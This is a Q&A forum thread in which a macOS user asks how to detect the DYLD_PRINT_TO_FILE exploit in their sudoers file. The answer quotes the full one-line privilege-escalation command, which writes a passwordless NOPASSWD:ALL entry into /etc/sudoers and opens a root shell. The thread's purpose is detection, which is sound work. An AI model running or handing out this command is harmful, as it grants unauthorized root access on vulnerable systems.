DYLD_PRINT_TO_FILE & sudoers Exploit: What are the markers in the sudoers file? <body> I am concerned about the DYLD_PRINT_TO_FILE exploit in the sudoers file.   https://blog.malwarebytes.org/mac/2015/08/dyld_print_to_file-exploit-found-in-the-wild/  If I have my sudoers file open, what are the markers I should be looking for as a sign of infection? My sudoers file is actually quite small and too my (mostly untrained) eye, I don't see anything that would be a concern. But what are some examples of lines/variables that would indicate a problem?  Here's is the bottom half of my file, nothing there jumps out at me. Thoughts?  precode# User privilege specification root    ALL=(ALL) ALL %admin  ALL=(ALL) ALL  # Uncomment to allow people in group wheel to run all commands # %wheel    ALL=(ALL) ALL  # Same thing without a password # %wheel    ALL=(ALL) NOPASSWD: ALL  # Samples # %users  ALL=/sbin/mount /cdrom,/sbin/umount /cdrom # %users  localhost=/sbin/shutdown -h now /code/pre  <answer199016> This is the infecting command:  precodeecho 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" &gt;&amp;3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s /code/pre  This means, that you'll have line like:  precodeUSERNAME ALL=(ALL) NOPASSWD:ALL /code/pre  at the end of your codesudoers/code file.  NOTE: codeUSERNAME/code is your username in the system. It won't have hash tag code#/code in front.
